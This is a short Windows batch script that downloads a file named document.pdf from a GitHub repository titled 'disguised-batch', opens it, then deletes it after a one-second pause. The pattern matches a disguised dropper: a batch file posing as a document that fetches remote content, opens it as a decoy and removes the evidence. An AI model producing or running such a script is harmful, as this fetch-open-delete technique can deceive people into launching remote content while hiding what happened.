@echo off
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/wishtag/disguised-batch/refs/heads/main/document.pdf -OutFile document.pdf"
document.pdf
timeout /t 1 /nobreak
del document.pdf